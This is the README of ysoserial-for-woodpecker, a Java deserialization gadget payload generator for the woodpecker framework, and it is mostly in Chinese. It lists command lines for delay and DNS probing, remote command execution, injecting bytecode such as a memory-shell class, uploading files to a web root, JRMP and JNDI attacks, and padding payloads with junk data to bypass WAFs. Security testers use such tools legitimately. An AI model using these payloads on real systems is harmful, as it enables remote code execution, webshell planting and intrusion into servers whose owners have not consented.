# ysoserial-for-woodpecker

## 0x01 简介
`ysoserial-for-woodpecker`是基于 [ysoserial](https://github.com/frohoff/ysoserial) ,为woodpecker框架定制开发的JDK反序列化gadget集成库。

## 0x02 编译
Requires Java 1.7+ and Maven 3.x+

```
mvn clean package -DskipTests
```
## 0x03 简单使用

```
usage: ysoserial-for-woodpecker-<version>.jar [-a <arg>] [-c] [-ddl <arg>]
       [-g <arg>] [-l]
 -a,--args <arg>                 gadget parameters
 -c,--compress                   Zip the Templates gadgets
 -ddl,--dirt-data-length <arg>   Add the length of dirty data, used to
                                 bypass WAF
 -g,--gadget <arg>               java deserialization gadget
 -l,--list                       List all gadgets
```


#### 3.1 延时探测
```
java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "sleep:10"
```
#### 3.2 dns探测
```
java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "dnslog:xxx.dnslog.cn"
```

#### 3.3 DNS探测class
```
java -jar ysoserial-for-woodpecker-<version>.jar -g FindClassByDNS -a "http://string.dnslog.cn|java.lang.String"
```

#### 3.4 延时探测class
注意设置深度，经过实战深度一般在25-28之间，太大会导致dos。

```
java -jar ysoserial-for-woodpecker-<version>.jar -g FindClassByBomb -a "java.lang.String|28"
```

#### 3.5 执行命令

```
java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "raw_cmd:calc.exe"
```

#### 3.6 执行自定义字节码

```
java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "class_file:/tmp/memshell.class"
```

#### 3.7 上传文件

```
java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "upload_file:/tmp/local_file.txt|/var/www/remote_file.txt"
```

#### 3.8 执行js

```
java -jar ysoserial-for-woodpecker-<version>.jar -g CommonsBeanutils1 -a "script_file:/tmp/sleep.js"
```

#### 3.9 JRMP

```
java -cp ysoserial-for-woodpecker-<version>.jar me.gv7.woodpecker.yso.exploit.JRMPListener 1234 CommonsCollections6Lite "raw_cmd:calc.exe"
```

#### 3.10 JNDI

```
java -jar ysoserial-for-woodpecker-<version>.jar -g Spring3 -a "jndi:ldap://127.0.0.1:1089/obj"
```

更多功能移步`0x04 更多功能命令`
## 0x04 更多功能命令
- [ ] sleep 生成延时payload
- [ ] dnslog 生成dnslog payload
- [ ] httplog 生成httplog payload
- [ ] upload_file  上传文件，通过文件名
- [ ] upload_file_base64 上传文件，通过文件base64内容
- [ ] raw_cmd 原生的命令执行
- [ ] win_cmd 在windows下执行命令
- [ ] linux_cmd 在linux下执行命令
- [ ] auto_cmd  自动判断操作系统执行命令
- [ ] class_file 注入class文件，执行class代码
- [ ] class_base64 注入class base64编码内容，执行class代码
- [ ] code_file 注入要执行的代码
- [ ] code_base64 注入要执行代码的base64编码
- [ ] bcel 注入bcel字符串，实现代码执行
- [ ] bcel_class_file 通过文件注入
- [ ] bcel_with_args 注入bcel字符串和参数，实现代码执行
- [ ] bcel_class_file_with_args 通过文件注入和参数，实现代码执行
- [ ] script_file 通过js引擎执行代码
- [ ] script_base64  通过js引擎执行代码
- [ ] loadjar 调用jar中类的无参构造器
- [ ] loadjar_with_args 调用jar中类的参数为一个String的构造器
- [ ] jndi jndi注入
